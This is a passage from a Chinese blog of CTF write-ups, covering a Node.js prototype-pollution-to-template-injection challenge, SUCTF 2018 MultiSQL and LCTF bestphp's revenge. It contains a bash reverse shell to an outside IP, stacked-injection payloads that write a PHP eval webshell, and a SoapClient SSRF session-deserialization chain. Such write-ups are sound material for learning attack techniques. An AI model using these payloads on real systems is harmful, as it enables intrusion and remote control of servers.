然后登录就用<code>ADMIN</code> 成功登录</p><p>然后到了<code>/action</code>路由</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/action&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">data</span> = <span class="title function_">clone</span>(req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p> <code>req.session.user.data = clone(req.body);</code>这一条语句用到了我们的原型链污染</p><p>那么应该污染谁呢 暂且放着</p><p>再来看<code>/info</code>路由</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/info&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.<span class="property">outputFunctionName</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>又是老朋友render 看到他就想到ssti </p><p>可以看到如果我们能控制<code>utputFunctionName</code>这个参数我们就可以进行ssti了</p><p>跟踪一下 竟然发现这个变量没有定义</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689748463034-f5b3908d-9721-433c-aabf-caf52a779bc9.png" alt="img"></p><p>这就很诡异了 所以我们可以在<code>/action</code>路由下对他进行原型链污染  然后在<code>/info </code>对他进行ssti 这样就能getshell了</p><p>请求包paylaod:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /action <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: a041d509-23fe-47c0-8d98-0f5b4ac46eaf.<span class="property">node4</span>.<span class="property">buuoj</span>.<span class="property">cn</span>:<span class="number">81</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">178</span></span><br><span class="line"><span class="title class_">Cache</span>-<span class="title class_">Control</span>: max-age=<span class="number">0</span></span><br><span class="line"><span class="title class_">Upgrade</span>-<span class="title class_">Insecure</span>-<span class="title class_">Requests</span>: <span class="number">1</span></span><br><span class="line"><span class="title class_">Origin</span>: <span class="attr">http</span>:<span class="comment">//a041d509-23fe-47c0-8d98-0f5b4ac46eaf.node4.buuoj.cn:81</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/json</span><br><span class="line"><span class="title class_">User</span>-<span class="title class_">Agent</span>: <span class="title class_">Mozilla</span>/<span class="number">5.0</span> (<span class="title class_">Windows</span> <span class="variable constant_">NT</span> <span class="number">10.0</span>; <span class="title class_">Win64</span>; x64) <span class="title class_">AppleWebKit</span>/<span class="number">537.36</span> (<span class="variable constant_">KHTML</span>, like <span class="title class_">Gecko</span>) <span class="title class_">Chrome</span>/<span class="number">114.0</span><span class="number">.0</span><span class="number">.0</span> <span class="title class_">Safari</span>/<span class="number">537.36</span></span><br><span class="line"><span class="title class_">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Referer: http://a041d509-23fe-47c0-8d98-0f5b4ac46eaf.node4.buuoj.cn:81/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: __gads=ID=2a013f3dde9ad985-2254f58cafe700cf:T=1689741221:RT=1689742200:S=ALNI_Maqp-fX6ej98tcXJHWIvb4mWhQdSg; __gpi=UID=00000c2221d9f3e8:T=1689741221:RT=1689742200:S=ALNI_MZMzVabCNghJHJfa6k9qDxOuQgInA; session=s%3A3n0kVmpVgibTGbZVYa8G39JKQSWntKeb.vA90xq%2FPvNzD14nbbu%2BW1WAfLwNX6o9st2OOFs%2Bgyqc</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;&quot;Submit&quot;:&quot;&quot;,&quot;lua&quot;:&quot;&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/8.130.34.53/7777 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>这里要注意就是我们提交的payload形式一定要是json格式的  <code>Content-Type: application/json</code></p><p>然后我这里是用反弹shell</p><p>访问<code>/info </code>  成功</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689748624364-dcb3a261-6eda-4b4c-b527-ca68431e5347.png" alt="img"></p><h1 id="120、-SUCTF-2018-MultiSQL"><a href="#120、-SUCTF-2018-MultiSQL" class="headerlink" title="120、[SUCTF 2018]MultiSQL"></a>120、[SUCTF 2018]MultiSQL</h1><p>考点：mysql预编译 复习一下旧知识 都好久了 忘了</p><p>看标题就是sql注入</p><p>首先在注册的时候就多加个<code>&#39;</code> 看看会怎样 一般这里可能会存在二次注入之类的</p><p>发现被转义了 作罢</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689838045915-1e652331-c3d3-49a1-8689-efe900b70c8f.png" alt="img"></p><p>点用户信息发现url不对劲</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689838230226-da7aa30a-ee41-4f54-b33b-ad23d0c2f0f4.png" alt="img"></p><p>感觉这里存在sql注入</p><p>fuzz 发现过滤了<code>union，select ，&amp;，|</code> 那么我们一般的select查询就不要想了</p><p>然后这道题目其实考察的是堆叠注入</p><p>然后搭配预编译写🐎</p><p>有两种方式 一种是用char()写🐎 另一种是16进制搭配hex()函数写🐎</p><p>在做这道题目之前还从来没在sql注入的时候写过🐎 属于是第一次见了</p><p>首先是预编译 在很早以前 做buu题目的时候就见过预编译</p><p>首先是<code>set @A=sql语句;prepare B from @A;execute B;</code>格式就是如此</p><p>这里的sql语句就是我们要在mysql中写一句话木马的语句 如下格式</p><p>其实我最懵逼的就是这个路径为什么要在<code>/favicon</code>下 很奇怪 为什么 直接在<code>/var/www/html</code>就不行 看了很多wp 就是没提及这一点  之后在神の的wp中 发现是题目可以扫到一个这个目录 真夸张 御剑的字典没这个目录 如果真在比赛中做 我百分之百做不出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell.php&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689840034510-98325feb-b607-4124-bebc-3c2155883f5d.png" alt="img"></p><h2 id="第一种char-写🐎"><a href="#第一种char-写🐎" class="headerlink" title="第一种char()写🐎"></a>第一种char()写🐎</h2><p>原理：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689841296825-af77f53d-2cd9-4628-bce9-ce1423b66c83.png" alt="img"></p><p>就是利用char函数 bypass 对select等字符的限制</p><p>随便写个脚本 跑一下就行了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689841351215-aff04d5a-2019-4055-8abc-c8cf413c22c4.png" alt="img"></p><p>payload:</p><p><code>select &#39;&lt;?php eval($_POST[x]);?&gt;&#39; into outfile &#39;/var/www/html/favicon/1.php&#39;;</code> 转成对应的ascii编码的字符 然后搭配预编译打入即可</p><h2 id="第二种-hex-搭配十六进制写🐎"><a href="#第二种-hex-搭配十六进制写🐎" class="headerlink" title="第二种 hex()搭配十六进制写🐎"></a>第二种 hex()搭配十六进制写🐎</h2><p>payload和上面一样只不过 这里转为16进制就行了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689841581083-5f4b6cae-f94e-4b3f-b789-3d2336b40959.png" alt="img"></p><p>原理：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689841713358-d2c8e3ff-c663-4305-85dc-74b7785188e7.png" alt="img"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php eval($_POST[x]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/1.php&#x27;;</span><br><span class="line">set @A=0x73656C65637420273C3F706870206576616C28245F504F53545B636D645D293B3F3E2720696E746F206F757466696C6520272F7661722F7777772F68746D6C2F66617669636F6E2F7368656C6C2E706870273B;prepare B from @A;execute B;</span><br></pre></td></tr></table></figure><h1 id="121、bestphp’s-revenge"><a href="#121、bestphp’s-revenge" class="headerlink" title="121、bestphp’s revenge"></a>121、bestphp’s revenge</h1><p>啊啊啊啊  又是信息爆炸的一题 真是一题比一题炸裂 一天做一题弄明白脑子就已经炸了</p><p>一共有两个文件</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>], <span class="variable">$_POST</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$b</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">only localhost can get flag!<span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;only localhost can get flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">       <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>] = <span class="variable">$flag</span>;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure><p>看flag.php 我们需要本地访问才能拿到flag </p><p>但是我们直接通过xff修改ip获取不到 这里就很像之前做的一道题目</p><p>要通过ssrf 打才行</p><p>来分析一下index.php</p><h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><p>首先是一个call_user_func() 第一个参数作为回调函数执行 第二个参数作为回调函数的参数传入</p><p>但是这里一开始我在想为什么不直接通过system()当回调函数 直接进行命令执行 </p><p>后来发现$_POST只能以键值 也就是A&#x3D;B的形式传入才行 </p><p>只传入一个A是post不上去的 所以A&#x3D;B的形式肯定不符合call_user_func()第二个参数无果</p><p>除此之外 这个函数不仅仅只能传入函数 还可以通过数组包含类的方式执行类的方法</p><p>如下：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689863056915-faa2b80d-4893-41f9-afaa-78862cad8a45.png" alt="img"></p><p> 把第一个值当作类名，第二个值当作方法进行回调</p><h2 id="php-session反序列化机制"><a href="#php-session反序列化机制" class="headerlink" title="php session反序列化机制"></a>php session反序列化机制</h2><p>其次是php session反序列化机制 <a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a> 具体可参考这个文章 这个师傅写的很详细</p><p>之前在ctfshow 刷题的时候也遇到了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.serialize_handler   string --定义用来序列化/反序列化的处理器名字。默认使用php</span><br></pre></td></tr></table></figure><p>session.serialize_handler是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。  </p><p>一共有三种</p><ul><li>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</li><li>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</li><li>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</li></ul><p>存储机制：</p><p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。<br>存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容。</p><p>当序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞。  </p><p>例如传入<code>$_SESSION[&#39;name&#39;]=&#39;|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&#39;;</code> </p><p>序列化引擎使用的是php_serialize，那么储存的session文件为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>而反序列化引擎如果使用的是php，就会把|作为作为key和value的分隔符。把<code>a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;</code>当作键名，而把<code>O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;</code>当作经过serialize()函数处理过的值，最后会把它进行unserialize处理，此时就构成了一次反序列化注入攻击。  </p><h2 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h2><p>再就是到可以ssrf的类 之前刷ctfshow的题目时候就遇到曾经用过这个类 SoapClient  它可以发送http请求包</p><p> 利用php原生类SoapClient中的__call方法进行SSRF</p><p>在新建一个<strong>SoapClient</strong>的类对象的时候，需要有两个参数，一个是字符串形式的<strong>wsdl</strong>，另一个是数组形式的<strong>options</strong>。而<strong>wsdl</strong>在开发中十分常见，在安全中用的比较少 ，并且这里也用不到，所以设为null就行了。</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689864728281-c032ebaf-c62c-4b99-835a-e88cdcfe9cc7.png" alt="img"></p><p>构造序列化字符串：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="variable">$url</span>, <span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$url</span>));</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">|O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>SoapClient%<span class="number">22</span>%<span class="number">3</span>A36%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A15%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>uri%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>style%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A15%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span><span class="keyword">use</span>%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A20%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>location%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>trace%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>compression%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A15%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>sdl%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A19%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>typemap%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A22%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>httpsocket%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A19%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>httpurl%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_login%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_password%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_use_digest%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A19%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_digest%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_proxy_host%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_proxy_port%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A24%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_proxy_login%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A27%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_proxy_password%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_exceptions%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_encoding%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_classmap%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_features%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A31%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_connection_timeout%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A27%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_stream_context%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_user_agent%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_keep_alive%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_ssl_method%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_soap_version%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A22%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_use_proxy%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A20%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_cookies%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A29%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>__default_headers%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A24%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>__soap_fault%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A26%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>__last_request%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A27%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>__last_response%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A34%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>__last_request_headers%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A35%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>__last_response_headers%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>至于这一行<code>$b = new SoapClient(null, array(&#39;uri&#39; =&gt; $url, &#39;location&#39; =&gt; $url));</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689865079531-bdee449b-dea8-4904-858a-844632b40566.png" alt="img"></p><p>本题的思路：</p><p>利用回调函数覆盖session序列化引擎为php_serilaze  在代码中这样<code>session_start(serialize_hander=php_serialize)</code>  可以查php手册能这样修改  一开始问gpt说不能这样 着实是被误导了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689867197838-9f5e2a67-85ef-4ab1-80ab-409e4fab2459.png" alt="img"></p><p>构造SSRF的Soap类的序列化字符串配合序列化注入写入session文件 文件名要用phpsessid&#x3D;8位自己设置一下</p><p>利用变量覆盖漏洞，用extract()覆盖掉变量b为回调函数call_user_func，回调函数调用Soap类的未知方法，触发__call方法进行SSRF访问flag.php。把flag写入session，再把session打印出来即可。</p><p>请求包：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?f=session_start&amp;name=|O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>SoapClient%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>uri%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>location%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>_soap_version%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D HTTP/<span class="number">1.1</span></span><br><span class="line">Host: b409417f-d781-<span class="number">4e26</span>-ae3a-<span class="number">96e176</span>b88d1a.node4.buuoj.cn:<span class="number">81</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span 